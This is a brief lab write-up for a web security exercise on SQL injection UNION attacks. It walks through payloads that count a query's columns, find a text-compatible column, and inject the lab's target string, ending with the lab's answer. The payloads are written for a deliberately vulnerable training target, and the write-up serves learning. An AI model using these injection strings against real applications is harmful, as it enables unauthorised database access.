# Lab: SQL injection UNION attack, finding a column containing text

**End Goal:** Perform a SQL injection UNION attack that returns an additional row containing the value provided.

**Analysis**

*Check how many columns are there.*

' UNION SELECT NULL-- -

*Returns error*

' UNION SELECT NULL, NULL-- -

*Returns error*

' UNION SELECT NULL, NULL, NULL-- -

*Did not return errors so 3 columns in total. The next step is to identify a column that is compatible with string data.*

' UNION SELECT 'a', NULL, NULL-- -

*Returns error*

' UNION SELECT NULL, 'a', NULL-- -

*Did not return errors. Can add the string now.*

**Answer:** 

' UNION SELECT NULL, 'HdFHvz', NULL-- -

